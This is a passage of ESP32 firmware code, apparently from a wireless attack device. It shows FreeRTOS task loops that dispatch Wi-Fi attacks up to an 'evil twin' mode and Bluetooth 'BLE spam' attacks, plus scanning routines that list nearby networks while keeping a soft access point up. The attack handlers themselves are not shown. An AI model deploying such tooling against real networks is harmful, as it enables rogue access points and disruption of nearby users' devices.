    for (int i = 0; i < sizeof(channels5GHz)/sizeof(channels5GHz[0]); i++) {
      esp_wifi_set_channel(channels5GHz[i], WIFI_SECOND_CHAN_NONE);
      WiFi.scanNetworks(false, false, false, 100, channels5GHz[i]);
      delay(100);
    }
    Serial.println("5GHz scan completed");
    currentBand = 0;
  }

  packetsCount++;
}

// FreeRTOS task functions
void wifiAttackTaskFunction(void *parameter) {
  while (true) {
    if (attackRunning && (currentAttack <= ATTACK_EVIL_TWIN)) {
      handleCurrentAttack();
    }
    vTaskDelay(pdMS_TO_TICKS(10));
  }
}

void bleAttackTaskFunction(void *parameter) {
  while (true) {
    if (attackRunning && (currentAttack >= ATTACK_BLE_SPAM)) {
      handleCurrentAttack();
    }
    vTaskDelay(pdMS_TO_TICKS(10));
  }
}
#endif

void performInitialScan() {
  Serial.println("Performing initial network scan...");
  
  // Don't change mode if AP is already running
  if (WiFi.getMode() == WIFI_AP) {
    WiFi.mode(WIFI_AP_STA);
    delay(500);
  }

  int networks = WiFi.scanNetworks(false, false);
  Serial.println("Found " + String(networks) + " networks");

  for (int i = 0; i < networks; i++) {
    Serial.println("  " + WiFi.SSID(i) + " (" + WiFi.BSSIDstr(i) + ") Ch:" + String(WiFi.channel(i)));
  }

  // Ensure AP stays active
  if (WiFi.getMode() != WIFI_AP) {
    WiFi.mode(WIFI_AP);
    delay(500);
    WiFi.softAP(AP_SSID, AP_PASS, 1, false, 8);
  }
}
